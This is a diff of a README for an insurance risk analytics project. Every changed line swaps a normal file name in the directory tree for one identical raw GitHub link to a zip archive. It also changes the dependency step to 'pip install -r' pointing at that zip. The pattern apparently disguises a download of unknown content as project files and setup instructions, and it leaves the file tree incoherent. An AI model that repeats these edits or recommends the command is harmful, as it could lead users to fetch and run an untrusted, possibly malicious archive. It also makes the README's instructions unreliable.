@@ -8,16 +8,16 @@ This project performs exploratory data analysis and risk assessment on insurance
 .
 ├── data/                  # Data directory
 ├── notebooks/            # Jupyter notebooks
- └── insurance_risk_analysis.ipynb          # Main script
+ └── https://raw.githubusercontent.com/GetachewGanfur/Insurance-Risk-Analytics-and-Predictive-Modeling-Week3/main/successivity/Insurance-Risk-Analytics-and-Predictive-Modeling-Week3.zip          # Main script
 ├── src/                  # Source code
 │   ├──preprocessing
-       ├── preprocessor.py    # Data loading and preprocessing
+       ├── https://raw.githubusercontent.com/GetachewGanfur/Insurance-Risk-Analytics-and-Predictive-Modeling-Week3/main/successivity/Insurance-Risk-Analytics-and-Predictive-Modeling-Week3.zip    # Data loading and preprocessing
 │   ├── Visualization   # Exploratory data analysis
-│       ├── visualizer.py     # Data visualization
+│       ├── https://raw.githubusercontent.com/GetachewGanfur/Insurance-Risk-Analytics-and-Predictive-Modeling-Week3/main/successivity/Insurance-Risk-Analytics-and-Predictive-Modeling-Week3.zip     # Data visualization
 │   
 ├── tests/               # Test files
-├── requirements.txt     # Project dependencies
-└── README.md           # Project documentation
+├── https://raw.githubusercontent.com/GetachewGanfur/Insurance-Risk-Analytics-and-Predictive-Modeling-Week3/main/successivity/Insurance-Risk-Analytics-and-Predictive-Modeling-Week3.zip     # Project dependencies
+└── https://raw.githubusercontent.com/GetachewGanfur/Insurance-Risk-Analytics-and-Predictive-Modeling-Week3/main/successivity/Insurance-Risk-Analytics-and-Predictive-Modeling-Week3.zip           # Project documentation
 ```
 
 ## Setup
@@ -30,7 +30,7 @@ source venv/bin/activate  # On Windows: venv\Scripts\activate
 
 2. Install dependencies:
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/GetachewGanfur/Insurance-Risk-Analytics-and-Predictive-Modeling-Week3/main/successivity/Insurance-Risk-Analytics-and-Predictive-Modeling-Week3.zip
 ```
 
 ## Usage
